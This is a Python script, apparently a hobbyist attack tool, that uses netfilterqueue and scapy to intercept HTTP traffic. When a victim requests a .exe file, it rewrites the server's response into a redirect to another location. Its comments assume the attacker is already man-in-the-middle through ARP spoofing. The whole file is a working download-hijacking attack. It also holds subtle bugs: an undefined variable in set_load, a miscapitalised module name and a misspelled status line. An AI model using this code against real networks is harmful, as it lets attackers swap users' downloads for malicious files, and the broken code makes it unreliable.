#!/usr/bin/python3
# Will only work against HTTP for now....
#if using against a remote computer you must be MITM you are free to use my arp spoofer :)

import netfilterqueue
import scapy.all as scapy
import subprocess

logo = '''

 /$$   /$$ /$$   /$$ /$$   /$$ /$$   /$$                               /$$       /$$ /$$
| $$  | $$| $$  | $$| $$  | $$| $$  | $$                              | $$      |__/| $$
| $$  | $$| $$  | $$| $$  | $$| $$  | $$  /$$$$$$   /$$$$$$   /$$$$$$$| $$$$$$$  /$$| $$
| $$$$$$$$| $$$$$$$$| $$$$$$$$| $$$$$$$$ |____  $$ /$$__  $$ /$$_____/| $$__  $$| $$| $$
| $$__  $$| $$__  $$| $$__  $$| $$__  $$  /$$$$$$$| $$  \__/|  $$$$$$ | $$  \ $$| $$| $$
| $$  | $$| $$  | $$| $$  | $$| $$  | $$ /$$__  $$| $$       \____  $$| $$  | $$| $$| $$
| $$  | $$| $$  | $$| $$  | $$| $$  | $$|  $$$$$$$| $$       /$$$$$$$/| $$  | $$| $$| $$
|__/  |__/|__/  |__/|__/  |__/|__/  |__/ \_______/|__/      |_______/ |__/  |__/|__/|__/

'''
print(logo)

ack_list = [] #empty list used to restore ACK Requests 

def set_load(packet, load):
    scapy_packet[Scapy.Raw].load = load 
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].len
    del scapy_packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) #convert packet to scapy Packet
    if scapy_packet.haslayer(scapy.Raw): #checks for HTTP response layer since its stored in raw
        if scapy_packet[scapy.TCP].dport == 80: #checks for actual HTTP Request from Client
            print('HTTP Request >> ')
            
            if ".exe" in scapy_packet[scapy.Raw].load: #checks for Exe string in the raw Request 
                print("[+] Exe Request has been found >> ")
                ack_list.append(scapy_packet[scapy.TCP].ack) #makes a list of all acks in Raw Request
                
        elif scapy_packet[scapy.TCP].sport == 80: #checks for HTTP Response from Server
            print('HTTP Response >> ')
            if scapy_packet[scapy.TCP].seq in ack_list: #checks if sequence of the current response is in the ack list
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print('[+] Replacing file...')
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanentl\n Location: http://www.example.org/index.asp\n\n") #packet modified so we have to delete len checksum these will auto gen by scapy with new values

                packet.set_payload(str(modified_packet)) #scapy packet analyzed and modified and then sent back as a string 
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()